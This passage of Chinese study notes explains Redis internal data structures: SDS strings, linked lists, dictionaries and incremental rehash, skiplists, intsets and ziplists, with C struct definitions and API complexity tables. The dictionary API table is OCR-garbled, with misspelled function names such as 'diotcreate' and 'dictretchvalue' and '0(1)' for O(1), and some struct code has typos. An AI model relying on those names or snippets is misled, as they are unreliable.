属性记录。通过未使用空间，SDS 实现了空间预分配和惰性空间释放两种优化策略。\n\n空间预分配空间预分配用于优化 SDS 的字符串增长操作：当 SDS 的 API 对一个 SDS 进行修改，并且需要对 SDS 进行空间扩展的时候，程序不仅会为 SDS 分配修改所必须要的空间，还会为 SDS 分配额外的未使用空间。额外分配的未使用空间数量由以下公式决定，这样可以减少连续修改字符串所需的内存重分配次数：\n如果对SDS进行修改之后，SDS的长度（也即是len属性的值）将小于1MB，那么程序分配和len属性同样大小的未使用空间，这时SDS len属性的值将和free属性的值相同。举个例子，如果进行修改之后，SDS的len将变成13字节，那么程序也会分配13字节的未使用空间，SDS的buf数组的实际长度将变成13+13+1&#x3D;27字节（额外的一字节用于保存空字符）。\n如果对SDS进行修改之后，SDS的长度将大于等于1MB，那么程序会分配1MB的未使用空间。举个例子，如果进行修改之后，SDS的len将变成30MB，那么程序会分配1MB的未使用空间，SDS的buf数组的实际长度将为30MB+1MB+1byte。\n\n\n惰性空间释放惰性空间释放用于优化SDS的字符串缩短操作：当SDS的API需要缩短SDS保存的字符串时，程序并不立即使用内存重分配来回收缩短后多出来的字节，而是使用free属性将这些字节的数量记录起来，并等待将来使用。通过惰性空间释放策略，SDS避免了缩短字符串时所需的内存重分配操作，并为将来可能有的增长操作提供了优化。SDS也提供了相应的API，可以在有需要时，真正地释放SDS的未使用空间，所以不用担心惰性空间释放策略会造成内存浪费。\n\n二进制安全C字符串中的字符必须符合某种编码（比如ASCII），并且除了字符串的末尾之外，字符串里面不能包含空字符，否则最先被程序读入的空字符将被误认为是字符串结尾，这些限制使得C字符串只能保存文本数据，而不能保存像图片、音频、视频、压缩文件这样的二进制数据。\n虽然数据库一般用于保存文本数据，但使用数据库来保存二进制数据的场景也不少见。因此，为了确保Redis可以适用于各种不同的使用场景，SDS的API都是二进制安全的（binary-safe）。所有SDS API都会以处理二进制的方式来处理SDS存放在buf数组里的数据，程序不会对其中的数据做任何限制、过滤、或者假设，数据在写入时是什么样的，它被读取时就是什么样。这也是SDS的buf属性被称为字节数组的原因——Redis不是用这个数组来保存字符，而是用它来保存一系列二进制数据。\n兼容部分C字符串函数虽然SDS的API都是二进制安全的，但它们一样遵循C字符串以空字符结尾的惯例：这些API总会将SDS保存的数据的末尾设置为空字符，并且总会在为buf数组分配空间时多分配一个字节来容纳这个空字符，这是为了让那些保存文本数据的SDS可以重用一部分&lt;string.h&gt;库定义的函数。\nSDS APISDS 主要操作 API\n\n\n\nAPI\n作用\n时间复杂度\n\n\n\nsdsnew\n创建一个包含给定 C 字符串的 SDS\nO(M)，M 为给定 C 字符串的长度\n\n\nsdsempty\n创建一个空的 SDS\nO(1)\n\n\nsdsfree\n释放给定的 SDS\nO(1)，只是释放内存\n\n\nsdslen\n返回 SDS 的已使用空间字节数\nO(1)，直接读取元数据\n\n\nsdsavail\n返回 SDS 的剩余可用空间字节数\nO(1)，直接读取元数据\n\n\nsdsdup\n创建一个给定 SDS 的副本\nO(M)，M 为给定 SDS 的长度\n\n\nsdsclear\n清空 SDS 保存的字符串内容\nO(1)，保留空间，不释放内存\n\n\nsdscat\n将给定 C 字符串拼接到 SDS 字符串的末尾\nO(M)，M 为被拼接 C 字符串的长度\n\n\nsdscatsds\n将给定 SDS 字符串拼接到另一个 SDS 字符串的末尾\nO(M)，M 为被拼接 SDS 字符串的长度\n\n\nsdscpy\n将给定的 C 字符串复制到 SDS 中，覆盖 SDS 原有的字符串\nO(N)，N 为被复制 C 字符串的长度\n\n\nsdsgrowzero\n扩展 SDS 到指定长度，如果长度变大，则在新增空间中填充零字符\nO(M)，M 为扩展新增的字节数\n\n\nsdssubstr\n保留 SDS 给定区间内的数据，不在区间内的数据会被覆盖或删除\nO(N)，N 为被保留数据的字节数\n\n\nsdstrim\n移除 SDS 中所有在给定 C 字符串中出现过的字符\nO(M)，M 为给定 C 字符串的长度\n\n\nsdscmp\n比较两个 SDS 字符串是否相同\nO(N)，N 为两个 SDS 中较短的那个的长度\n\n\nEndRedis只会使用C字符串作为字面量，在大多数情况下，Redis使用SDS（Simple Dynamic String，简单动态字符串）作为字符串表示。\n这里对字符串的包装，跟很多其他语言中的字符串类似。不过大部分语言中的字符串是不可变的。可能和 go 中数组更类似，使用 make 来创建，可以传两个整型，第一个是长度，第二个是容量。\n第三章 - 链表链表提供了高效的节点重排能力，以及顺序性的节点访问方式，并且可以通过增删节点来灵活地调整链表的长度。作为一种常用数据结构，链表内置在很多高级的编程语言里面，因为Redis使用的C语言并没有内置这种数据结构，所以Redis构建了自己的链表实现。链表在Redis中的应用非常广泛，比如列表键的底层实现之一就是链表。当一个列表键包含了数量比较多的元素，又或者列表中包含的元素都是比较长的字符串时，Redis就会使用链表作为列表键的底层实现。除了链表键之外，发布与订阅、慢查询、监视器等功能也用到了链表，Redis服务器本身还使用链表来保存多个客户端的状态信息，以及使用链表来构建客户端输出缓冲区（output buffer）\n链表和链表节点的实现每个链表节点使用一个adlist.h&#x2F;listNode结构来表示：\ntypedef struct listNode &#123;    // 前置节点    struct listNode * prev;    // 后置节点    struct listNode * next;    // 节点的值    void * value;&#125;listNode;\n\n多个listNode可以通过prev和next指针组成双端链表，如下图\n\n虽然仅仅使用多个listNode结构就可以组成链表，但使用adlist.h&#x2F;list来持有链表的话，操作起来会更方便。\ntypedef struct list &#123;    // 表头节点    listNode * head;    // 表尾节点    listNode * tail;    // 链表所包含的节点数量    unsigned long len;    // 节点值复制函数    void *(*dup)(void *ptr);    // 节点值释放函数    void (*free)(void *ptr);    // 节点值对比函数    int (*match)(void *ptr,void *key);&#125; list;\n\nlist结构为链表提供了表头指针head、表尾指针tail，以及链表长度计数器len，而dup、free和match成员则是用于实现多态链表所需的类型特定函数：\n\ndup函数用于复制链表节点所保存的值\nfree函数用于释放链表节点所保存的值\nmatch函数则用于对比链表节点所保存的值和另一个输入值是否相等\n\n\nRedis的链表实现的特性可以总结如下：\n\n双端：链表节点带有prev和next指针，获取某个节点的前置节点和后置节点的复杂度都是O（1）。\n无环：表头节点的prev指针和表尾节点的next指针都指向NULL，对链表的访问以NULL为终点。\n带表头指针和表尾指针：通过list结构的head指针和tail指针，程序获取链表的表头节点和表尾节点的复杂度为O（1）。\n带链表长度计数器：程序使用list结构的len属性来对list持有的链表节点进行计数，程序获取链表中节点数量的复杂度为O（1）。\n多态：链表节点使用void*指针来保存节点值，并且可以通过list结构的dup、free、match三个属性为节点值设置类型特定函数，所以链表可以用于保存各种不同类型的值。\n\n链表和链表节点的API\n\n\n函数\n作用\n时间复杂度\n\n\n\nlistSetDupMethod\n将给定的函数设置为链表的节点值复制函数\n复制函数可以通过链表的 dup 属性直接获得，O(1)\n\n\nlistGetDupMethod\n返回链表当前正在使用的节点值复制函数\nO(1)\n\n\nlistSetFreeMethod\n将给定的函数设置为链表的节点值释放函数\n释放函数可以通过链表的 free 属性直接获得，O(1)\n\n\nlistGetFreeMethod\n返回链表当前正在使用的节点值释放函数\nO(1)\n\n\nlistSetMatchMethod\n将给定的函数设置为链表的节点值对比函数\n对比函数可以通过链表的 match 属性直接获得，O(1)\n\n\nlistGetMatchMethod\n返回链表当前正在使用的节点值对比函数\nO(1)\n\n\nlistLength\n返回链表的长度（包含多少个节点）\n链表长度可以通过链表的 len 属性直接获得，O(1)\n\n\nlistFirst\n返回链表的表头节点\n表头节点可以通过链表的 head 属性直接获得，O(1)\n\n\nlistLast\n返回链表的表尾节点\n表尾节点可以通过链表的 tail 属性直接获得，O(1)\n\n\nlistPrevNode\n返回给定节点的前置节点\n前置节点可以通过节点的 prev 属性直接获得，O(1)\n\n\nlistNextNode\n返回给定节点的后置节点\n后置节点可以通过节点的 next 属性直接获得，O(1)\n\n\nlistNodeValue\n返回给定节点当前保存的值\n节点值可以通过节点的 value 属性直接获得，O(1)\n\n\nlistCreate\n创建一个不包含任何节点的新链表\nO(1)\n\n\nlistAddNodeHead\n将一个包含给定值的新节点添加到链表的表头\nO(1)\n\n\nlistAddNodeTail\n将一个包含给定值的新节点添加到链表的表尾\nO(1)\n\n\nlistInsertNode\n将一个包含给定值的新节点插入到指定节点的前或后\nO(1)\n\n\nlistSearchKey\n查找并返回链表中包含给定值的节点\nO(N)，N 为链表长度\n\n\nlistIndex\n返回链表中给定索引位置的节点\nO(N)，N 为链表长度\n\n\nlistDelNode\n从链表中删除给定的节点\nO(1)\n\n\nlistRotate\n将链表的表尾节点弹出，并插入到链表的表头，成为新的表头节点\nO(1)\n\n\nlistDup\n复制一个给定链表的副本\nO(N)，N 为链表长度\n\n\nlistRelease\n释放给定链表及其所有节点\nO(N)，N 为链表长度\n\n\n第四章 - 字典字典，又称为符号表（symbol table）、关联数组（associative array）或映射（map），是一种用于保存键值对（key-value pair）的抽象数据结构。在字典中，一个键（key）可以和一个值（value）进行关联（或者说将键映射为值），这些关联的键和值就称为键值对。字典中的每个键都是独一无二的，程序可以在字典中根据键查找与之关联的值，或者通过键来更新值，又或者根据键来删除整个键值对，等等。字典经常作为一种数据结构内置在很多高级编程语言里面，但Redis所使用的C语言并没有内置这种数据结构，因此Redis构建了自己的字典实现。字典在Redis中的应用相当广泛，比如Redis的数据库就是使用字典来作为底层实现的，对数据库的增、删、查、改操作也是构建在对字典的操作之上的。\n字典的实现Redis的字典使用哈希表作为底层实现，一个哈希表里面可以有多个哈希表节点，而每个哈希表节点就保存了字典中的一个键值对。\n哈希表Redis字典所使用的哈希表由dict.h&#x2F;dictht结构定义：\ntypedef struct dictht &#123;\t// 哈希表数组\tdictEntry **table;\t// 哈希表大小\tunsigned long size;\t// 哈希表大小掩码，用于计算索引值\t// 总是等于size-1\tunsigned long sizemask;\t// 该哈希表已有节点的数量\tunsigned long used;&#125; dictht;\n\ntable 属性是一个数组，数组中的每个元素都是一个指向dict.h&#x2F;dictEntry结构的指针，每个dictEntry结构保存着一个键值对。size 属性记录了哈希表的大小，也即是table数组的大小。used 属性则记录了哈希表目前已有节点（键值对）的数量。sizemask 属性的值总是等于size-1，这个属性和哈希值一起决定一个键应该被放到table数组的哪个索引上面。\n\n哈希表节点哈希表节点使用dictEntry结构表示，每个dictEntry结构都保存着一个键值对：\ntypedef struct dictEntry &#123;    // 键    void *key;    // 值    union&#123;        void *val;        uint64_tu64;        int64_ts64;    &#125; v;    // 指向下个哈希表节点，形成链表    struct dictEntry *next;&#125; dictEntry;\n\nkey 属性保存着键值对中的键。v 属性则保存着键值对中的值，其中键值对的值可以是一个指针，或者是一个uint64_t整数，又或者是一个int64_t整数。next 属性是指向另一个哈希表节点的指针，这个指针可以将多个哈希值相同的键值对连接在一次，以此来解决键冲突（collision）的问题。\n\n字典Redis中的字典由dict.h&#x2F;dict结构表示：\ntypedef struct dict &#123;    // 类型特定函数    dictType *type;    // 私有数据    void *privdata;    // 哈希表    dictht ht[2];    // rehash索引    // 当rehash不在进行时，值为-1    in trehashidx; /* rehashing not in progress if rehashidx == -1 */&#125; dict;\n\ntype属性和privdata属性是针对不同类型的键值对，为创建多态字典而设置的：\n\ntype 属性是一个指向dictType结构的指针，每个dictType结构保存了一簇用于操作特定类型键值对的函数，Redis会为用途不同的字典设置不同的类型特定函数。\nprivdata 属性保存了需要传给那些类型特定函数的可选参数。\n\nht 属性是一个包含两个项的数组，数组中的每个项都是一个dictht哈希表，一般情况下，字典只使用ht[0]哈希表，ht[1]哈希表只会在对ht[0]哈希表进行rehash时使用。rehashidx 属性记录了rehash目前的进度，如果目前没有在进行rehash，那么它的值为-1。\ntypedef struct dictType &#123;    // 计算哈希值的函数    unsigned int (*hashFunction)(const void *key);    // 复制键的函数    void *(*keyDup)(void *privdata, const void *key);    // 复制值的函数    void *(*valDup)(void *privdata, const void *obj);    // 对比键的函数    int (*keyCompare)(void *privdata, const void *key1, const void *key2);    // 销毁键的函数    void (*keyDestructor)(void *privdata, void *key);    // 销毁值的函数    void (*valDestructor)(void *privdata, void *obj);&#125; dictType;\n\n\n哈希算法当要将一个新的键值对添加到字典里面时，程序需要先根据键值对的键计算出哈希值和索引值，然后再根据索引值，将包含新键值对的哈希表节点放到哈希表数组的指定索引上面。\nRedis计算哈希值和索引值的方法如下：\n使用字典设置的哈希函数，计算键 key 的哈希值hash = dict-&gt;type-&gt;hashFunction(key);\n使用哈希表的 sizemask 属性和哈希值，计算出索引值\n根据情况不同，ht[x]可以是ht[0]或者ht[1]index = hash &amp; dict-&gt;ht[x].sizemask;\n当字典被用作数据库的底层实现，或者哈希键的底层实现时，Redis使用MurmurHash2算法来计算键的哈希值。MurmurHash Wiki\n解决键冲突当有两个或以上数量的键被分配到了哈希表数组的同一个索引上面时，我们称这些键发生了冲突（collision）。Redis的哈希表使用链地址法（separate chaining）来解决键冲突，每个哈希表节点都有一个next指针，多个哈希表节点可以用next指针构成一个单向链表，被分配到同一个索引上的多个节点可以用这个单向链表连接起来，这就解决了键冲突的问题。因为dictEntry节点组成的链表没有指向链表表尾的指针，所以为了速度考虑，程序总是将新节点添加到链表的表头位置（复杂度为O（1）），排在其他已有节点的前面。\n\nRehash随着操作的不断执行，哈希表保存的键值对会逐渐地增多或者减少，为了让哈希表的负载因子（load factor）维持在一个合理的范围之内，当哈希表保存的键值对数量太多或者太少时，程序需要对哈希表的大小进行相应的扩展或者收缩。扩展和收缩哈希表的工作可以通过执行rehash（重新散列）操作来完成，Redis对字典的哈希表执行rehash的步骤如下：\n\n为字典的ht[1]哈希表分配空间，这个哈希表的空间大小取决于要执行的操作，以及ht[0]当前包含的键值对数量（也即是ht[0].used属性的值）：\n如果执行的是扩展操作，那么ht[1]的大小为第一个大于等于ht[0].used*2的2^n（2的n次方幂），即两倍。\n如果执行的是收缩操作，那么ht[1]的大小为第一个大于等于ht[0].used的2^n。即元素数量的最小倍数。\n\n\n将保存在ht[0]中的所有键值对rehash到ht[1]上面：rehash指的是重新计算键的哈希值和索引值，然后将键值对放置到ht[1]哈希表的指定位置上。\n当ht[0]包含的所有键值对都迁移到了ht[1]之后（ht[0]变为空表），释放ht[0]，将ht[1]设置为ht[0]，并在ht[1]新创建一个空白哈希表，为下一次rehash做准备。\n\n当以下条件中的任意一个被满足时，程序会自动开始对哈希表执行扩展操作：\n\n服务器目前没有在执行BGSAVE命令或者BGREWRITEAOF命令，并且哈希表的负载因子大于等于1。\n服务器目前正在执行BGSAVE命令或者BGREWRITEAOF命令，并且哈希表的负载因子大于等于5。\n\n当哈希表的负载因子小于0.1（即小于当前大小十倍）时，程序自动开始对哈希表执行收缩操作。\n其中哈希表的负载因子可以通过下面的公式算出：负载因子 &#x3D; 哈希表已保存节点数量 &#x2F; 哈希表大小load_factor &#x3D; ht[0].used &#x2F; ht[0].size\n根据BGSAVE命令或BGREWRITEAOF命令是否正在执行，服务器执行扩展操作所需的负载因子并不相同。这是因为在执行BGSAVE命令或BGREWRITEAOF命令的过程中，Redis需要创建当前服务器进程的子进程，而大多数操作系统都采用写时复制（copy-on-write）技术来优化子进程的使用效率。所以在子进程存在期间，服务器会提高执行扩展操作所需的负载因子，从而尽可能地避免在子进程存在期间进行哈希表扩展操作，这可以避免不必要的内存写入操作，最大限度地节约内存。\n\nBGSAVE 命令用于在后台异步地执行数据快照（snapshot）保存操作，即创建 Redis 数据的 RDB 文件。执行这个命令时，Redis 会生成一个 RDB 文件，并将当前数据库中的所有数据保存到这个文件中。BGREWRITEAOF 命令用于在后台异步地重写 AOF（Append Only File）日志文件。AOF 是 Redis 提供的另一种持久化方式，通过记录每一个写命令来实现数据的持久化。写时复制（copy-on-write）是指当一个进程创建一个子进程时，子进程会共享父进程的内存页面，而不是立即拷贝整个内存数据。这种共享是“只读”的，直到某一方（父进程或子进程）试图修改共享的数据时，系统才会真正复制该内存页面。这种方式避免了在创建子进程时立即拷贝大量内存数据的开销。\n\n渐进式rehash扩展或收缩哈希表需要将ht[0]里面的所有键值对rehash到ht[1]里面，但是，这个rehash动作并不是一次性、集中式地完成的，而是分多次、渐进式地完成的。\n这样做的原因在于，如果ht[0]里只保存着四个键值对，那么服务器可以在瞬间就将这些键值对全部rehash到ht[1]；但是，如果哈希表里保存的键值对数量不是四个，而是四百万、四千万甚至四亿个键值对，那么要一次性将这些键值对全部rehash到ht[1]的话，庞大的计算量可能会导致服务器在一段时间内停止服务。因此，为了避免rehash对服务器性能造成影响，服务器不是一次性将ht[0]里面的所有键值对全部rehash到ht[1]，而是分多次、渐进式地将ht[0]里面的键值对慢慢地rehash到ht[1]。\n哈希表渐进式rehash的详细步骤：\n\n为ht[1]分配空间，让字典同时持有ht[0]和ht[1]两个哈希表。\n在字典中维持一个索引计数器变量rehashidx，并将它的值设置为0，表示rehash工作正式开始。\n在rehash进行期间，每次对字典执行添加、删除、查找或者更新操作时，程序除了执行指定的操作以外，还会顺带将ht[0]哈希表在rehashidx索引上的所有键值对rehash到ht[1]，当rehash工作完成之后，程序将rehashidx属性的值增一。\n随着字典操作的不断执行，最终在某个时间点上，ht[0]的所有键值对都会被rehash至ht[1]，这时程序将rehashidx属性的值设为-1，表示rehash操作已完成。\n\n渐进式rehash的好处在于它采取分而治之的方式，将rehash键值对所需的计算工作均摊到对字典的每个添加、删除、查找和更新操作上，从而避免了集中式rehash而带来的庞大计算量。\n渐进式rehash执行期间的哈希表操作因为在进行渐进式rehash的过程中，字典会同时使用ht[0]和ht[1]两个哈希表，所以在渐进式rehash进行期间，字典的删除（delete）、查找（find）、更新（update）等操作会在两个哈希表上进行。例如，要在字典里面查找一个键的话，程序会先在ht[0]里面进行查找，如果没找到的话，就会继续到ht[1]里面进行查找，诸如此类。\n另外，在渐进式rehash执行期间，新添加到字典的键值对一律会被保存到ht[1]里面，而ht[0]则不再进行任何添加操作，这一措施保证了ht[0]包含的键值对数量会只减不增，并随着rehash操作的执行而最终变成空表。\n字典API\n\n\n函 数\n作用\n时间复杂度\n\n\n\ndiotcreate\n创建一个新的字典\n0(1)\n\n\ndietAdd\n将给定的键值对添加到字典里面\n0(1)\n\n\ndiotkeplace\n将给定的健值对添加到字典里面，如果键已经 存在于字典，那么用新值取代原有的值\n0(1)\n\n\ndictretchvalue\n这回给定键的值\n0(1)\n\n\ndiotCetRandomKey\n从字典中随机返回个键值对\n0(1)\n\n\n第五章 - 跳跃表跳跃表（skiplist）是一种有序数据结构，它通过在每个节点中维持多个指向其他节点的指针，从而达到快速访问节点的目的。跳跃表支持平均O（logN）、最坏O（N）复杂度的节点查找，还可以通过顺序性操作来批量处理节点。在大部分情况下，跳跃表的效率可以和平衡树相媲美，并且因为跳跃表的实现比平衡树要来得更为简单，所以有不少程序都使用跳跃表来代替平衡树。Redis使用跳跃表作为有序集合键的底层实现之一，如果一个有序集合包含的元素数量比较多，又或者有序集合中元素的成员（member）是比较长的字符串时，Redis就会使用跳跃表来作为有序集合键的底层实现。\n和链表、字典等数据结构被广泛地应用在Redis内部不同，Redis只在两个地方用到了跳跃表，一个是实现有序集合键，另一个是在集群节点中用作内部数据结构，除此之外，跳跃表在Redis里面没有其他用途。\n跳跃表的实现Redis的跳跃表由redis.h&#x2F;zskiplistNode和redis.h&#x2F;zskiplist两个结构定义，其中zskiplistNode结构用于表示跳跃表节点，而zskiplist结构则用于保存跳跃表节点的相关信息，比如节点的数量，以及指向表头节点和表尾节点的指针等等。\n\n上图一个跳跃表示例，位于图片最左边的是 zskiplist 结构，该结构包含以下属性：\n\nheader：指向跳跃表的表头节点。\ntail：指向跳跃表的表尾节点。\nlevel：记录目前跳跃表内，层数最大的那个节点的层数（表头节点的层数不计算在内）。\nlength：记录跳跃表的长度，也即是，跳跃表目前包含节点的数量（表头节点不计算在内）。\n\n位于zskiplist结构右方的是四个zskiplistNode结构，该结构包含以下属性：\n\n层（level）：节点中用L1、L2、L3等字样标记节点的各个层，L1代表第一层，L2代表第二层，以此类推。每个层都带有两个属性：前进指针和跨度。前进指针用于访问位于表尾方向的其他节点，而跨度则记录了前进指针所指向节点和当前节点的距离。在上面的图片中，连线上带有数字的箭头就代表前进指针，而那个数字就是跨度。当程序从表头向表尾进行遍历时，访问会沿着层的前进指针进行。\n后退（backward）指针：节点中用BW字样标记节点的后退指针，它指向位于当前节点的前一个节点。后退指针在程序从表尾向表头遍历时使用。\n分值（score）：各个节点中的1.0、2.0和3.0是节点所保存的分值。在跳跃表中，节点按各自所保存的分值从小到大排列。\n成员对象（obj）：各个节点中的o1、o2和o3是节点所保存的成员对象。\n\n注意表头节点和其他节点的构造是一样的：表头节点也有后退指针、分值和成员对象，不过表头节点的这些属性都不会被用到，所以图中省略了这些部分，只显示了表头节点的各个层。\n跳跃表节点跳跃表节点的实现由redis.h&#x2F;zskiplistNode结构定义：\ntypedef struct zskiplistNode &#123;    // 层    struct zskiplistLevel &#123;        // 前进指针        struct zskiplistNode *forward;        // 跨度        unsigned int span;    &#125; level[];    // 后退指针    struct zskiplistNode *backward;    // 分值    double score;    // 成员对象    robj *obj;&#125; zskiplistNode;\n\n层跳跃表节点的level数组可以包含多个元素，每个元素都包含一个指向其他节点的指针，程序可以通过这些层来加快访问其他节点的速度，一般来说，层的数量越多，访问其他节点的速度就越快。每次创建一个新跳跃表节点的时候，程序都根据幂次定律（power law，越大的数出现的概率越小）随机生成一个介于1和32之间的值作为level数组的大小，这个大小就是层的“高度”。\n前进指针每个层都有一个指向表尾方向的前进指针（level[i].forward属性），用于从表头向表尾方向访问节点。\n跨度层的跨度（level[i].span属性）用于记录两个节点之间的距离：\n\n两个节点之间的跨度越大，它们相距得就越远。\n指向NULL的所有前进指针的跨度都为0，因为它们没有连向任何节点。\n\n初看上去，很容易以为跨度和遍历操作有关，但实际上并不是这样，遍历操作只使用前进指针就可以完成了，跨度实际上是用来计算排位（rank）的：在查找某个节点的过程中，将沿途访问过的所有层的跨度累计起来，得到的结果就是目标节点在跳跃表中的排位。当查找某个值时，程序会从最高层开始逐层往下搜索，每一层会利用跨度跳过多个节点，直到找到目标节点或进入下一层。 可以提高查询的效率。\n后退指针节点的后退指针（backward属性）用于从表尾向表头方向访问节点：跟可以一次跳过多个节点的前进指针不同，因为每个节点只有一个后退指针，所以每次只能后退至前一个节点。\n分值和成员节点的分值（score属性）是一个double类型的浮点数，跳跃表中的所有节点都按分值从小到大来排序。节点的成员对象（obj属性）是一个指针，它指向一个字符串对象，而字符串对象则保存着一个SDS值。在同一个跳跃表中，各个节点保存的成员对象必须是唯一的，但是多个节点保存的分值却可以是相同的：分值相同的节点将按照成员对象在字典序中的大小来进行排序，成员对象较小的节点会排在前面（靠近表头的方向），而成员对象较大的节点则会排在后面（靠近表尾的方向）。\n跳跃表仅靠多个跳跃表节点就可以组成一个跳跃表。但通过使用一个zskiplist结构来持有这些节点，程序可以更方便地对整个跳跃表进行处理，比如快速访问跳跃表的表头节点和表尾节点，或者快速地获取跳跃表节点的数量（也即是跳跃表的长度）等信息。\nzskiplist结构的定义如下：\ntypedef struct zskiplist &#123;    // 表头节点和表尾节点    structz skiplistNode *header, *tail;    // 表中节点的数量    unsigned long length;    // 表中层数最大的节点的层数    int level;&#125; zskiplist;\n\nheader和tail指针分别指向跳跃表的表头和表尾节点，通过这两个指针，程序定位表头节点和表尾节点的复杂度为O（1）。通过使用length属性来记录节点的数量，程序可以在O（1）复杂度内返回跳跃表的长度。level属性则用于在O（1）复杂度内获取跳跃表中层高最大的那个节点的层数量，注意表头节点的层高并不计算在内。\n跳跃表API\n\n\n函数\n作用\n时间复杂度\n\n\n\nzslCreate\n创建一个新的跳跃表\nO(1)\n\n\nzslFree\n释放给定的跳跃表及其包含的所有节点\nO(N)，N 为跳跃表的长度\n\n\nzslInsert\n将包含给定成员和分值的新节点添加到跳跃表中\n平均 O(log N)，最坏 O(N)\n\n\nzslDelete\n删除跳跃表中包含给定成员和分值的节点\n平均 O(log N)，最坏 O(N)\n\n\nzslGetRank\n返回包含给定成员和分值的节点在跳跃表中的排名\n平均 O(log N)，最坏 O(N)\n\n\nzslGetElementByRank\n返回跳跃表中指定排名的节点\n平均 O(log N)，最坏 O(N)\n\n\nzslIsInRange\n判断跳跃表中是否存在至少一个节点的分值在给定范围内\nO(1)，只需检查表头和表尾节点即可\n\n\nzslFirstInRange\n返回跳跃表中第一个符合指定分值范围的节点\n平均 O(log N)，最坏 O(N)\n\n\n第六章 - 整数集合整数集合（intset）是集合键的底层实现之一，当一个集合只包含整数值元素，并且这个集合的元素数量不多时，Redis就会使用整数集合作为集合键的底层实现。\n整数集合的实现整数集合（intset）是Redis用于保存整数值的集合抽象数据结构，它可以保存类型为 int16_t、int32_t或者int64_t 的整数值，并且保证集合中不会出现重复元素。每个intset.h&#x2F;intset结构表示一个整数集合：\ntypedef struct intset &#123;    // 编码方式    uint32_t encoding;    // 集合包含的元素数量    uint32_t length;    // 保存元素的数组    int8_t contents[];&#125; intset;\n\ncontents 数组是整数集合的底层实现：整数集合的每个元素都是contents数组的一个数组项（item），各个项在数组中按值的大小从小到大有序地排列，并且数组中不包含任何重复项。length 属性记录了整数集合包含的元素数量，也即是contents数组的长度。\n虽然intset结构将contents属性声明为int8_t类型的数组，但实际上contents数组并不保存任何int8_t类型的值，contents数组的真正类型取决于encoding属性的值：\n\n如果encoding属性的值为INTSET_ENC_INT16，那么contents就是一个int16_t类型的数组，数组里的每个项都是一个int16_t类型的整数值（最小值为-32768，最大值为32767）。\n如果encoding属性的值为INTSET_ENC_INT32，那么contents就是一个int32_t类型的数组，数组里的每个项都是一个int32_t类型的整数值（最小值为-2147483648，最大值为2147483647）。\n如果encoding属性的值为INTSET_ENC_INT64，那么contents就是一个int64_t类型的数组，数组里的每个项都是一个int64_t类型的整数值（最小值为-9223372036854775808，最大值为9223372036854775807）。\n\n\n当向一个底层为int16_t数组的整数集合添加一个int64_t类型的整数值时，整数集合已有的所有元素都会被转换成int64_t类型。即升级规则。\n\n升级规则（Redis 会对整数集合进行自动升级，以支持不同大小的整数类型。）自动升级触发条件：当一个新插入的整数无法在当前整数集合的类型范围内表示时，Redis 会触发升级。全量复制与排序：Redis 会分配新的内存空间，将原来的所有整数复制到新类型的整数集合中。升级后的整数集合会保持有序状态，以便于后续查找操作。升级不可逆：一旦整数集合升级到更大类型，就不会降级。例如，一旦升级到 int64_t 类型，即使删除所有大整数，类型也不会恢复。\n\n升级每当我们要将一个新元素添加到整数集合里面，并且新元素的类型比整数集合现有所有元素的类型都要长时，整数集合需要先进行升级（upgrade），然后才能将新元素添加到整数集合里面。\n升级整数集合并添加新元素共分为三步进行：\n\n根据新元素的类型，扩展整数集合底层数组的空间大小，并为新元素分配空间。\n将底层数组现有的所有元素都转换成与新元素相同的类型，并将类型转换后的元素放置到正确的位上，而且在放置元素的过程中，需要继续维持底层数组的有序性质不变。\n将新元素添加到底层数组里面。\n\n因为每次向整数集合添加新元素都可能会引起升级，而每次升级都需要对底层数组中已有的所有元素进行类型转换，所以向整数集合添加新元素的时间复杂度为O（N）。\n因为引发升级的新元素的长度总是比整数集合现有所有元素的长度都大，所以这个新元素的值要么就大于所有现有元素，要么就小于所有现有元素：\n\n在新元素小于所有现有元素的情况下，新元素会被放置在底层数组的最开头（索引0）；\n在新元素大于所有现有元素的情况下，新元素会被放置在底层数组的最末尾（索引length-1）。\n\n整数集合的升级策略有两个好处，一个是提升整数集合的灵活性，另一个是尽可能地节约内存。\n因为C语言是静态类型语言，为了避免类型错误，我们通常不会将两种不同类型的值放在同一个数据结构里面。但是，因为整数集合可以通过自动升级底层数组来适应新元素，所以我们可以随意地将int16_t、int32_t或者int64_t类型的整数添加到集合中，而不必担心出现类型错误，这种做法非常灵活。同时因为根据具体情况来使用具体的类型，而不是全部使用int64_t，所以可以节约内存。\n降级整数集合不支持降级操作，一旦对数组进行了升级，编码就会一直保持升级后的状态。即使删除所有大整数，类型也不会恢复。\n整数集合API\n\n\n函数\n作用\n时间复杂度\n\n\n\nintsetNew\n创建一个新的整数集合\nO(1)\n\n\nintsetAdd\n将给定元素添加到整数集合中\nO(N)\n\n\nintsetRemove\n从整数集合中移除给定元素\nO(N)\n\n\nintsetFind\n检查给定值是否存在于集合中\nO(log N)，由于数组有序，可通过二分查找实现\n\n\nintsetRandom\n从整数集合中随机返回一个元素\nO(1)\n\n\nintsetGet\n取出底层数组中给定索引上的元素\nO(1)\n\n\nintsetLen\n返回整数集合中包含的元素个数\nO(1)\n\n\nintsetBlobLen\n返回整数集合的内存字节数\nO(1)\n\n\n第七章 - 压缩列表压缩列表（ziplist）是列表键和哈希键的底层实现之一。当一个列表键只包含少量列表项，并且每个列表项要么就是小整数值，要么就是长度比较短的字符串，那么Redis就会使用压缩列表来做列表键的底层实现。\n压缩列表的构成压缩列表是Redis为了节约内存而开发的，是由一系列特殊编码的连续内存块组成的顺序型（sequential）数据结构。一个压缩列表可以包含任意多个节点（entry），每个节点可以保存一个字节数组或者一个整数值。\n压缩列表主要由以下几个部分组成：\n\nHeader（头部）：\n\nzlbytes：4字节，表示整个压缩列表的总字节数，便于在内存中管理。\nzltail：4字节，记录最后一个元素的偏移量，使得可以快速定位尾部元素。\nzllen：2字节，表示压缩列表中包含的元素数量。如果数量大于 65535，zllen 只表示 65535，实际数量需要遍历确定。\n\n\nEntry（节点）：\n\nprevious_entry_length：1-5字节，表示前一个元素的长度，用于双向遍历。如果前一个元素长度小于 254 字节，previous_entry_length 用 1 字节表示；否则，用 5 字节表示。\nencoding：1-5字节，记录当前元素的数据类型和长度，用于解析元素内容。例如，数据可以是字节数组或整数类型。\ncontent：变长，存储元素的实际数据。\n\n\nEnd（结尾标志）：\n\n压缩列表以 1 字节特殊标志 0xFF 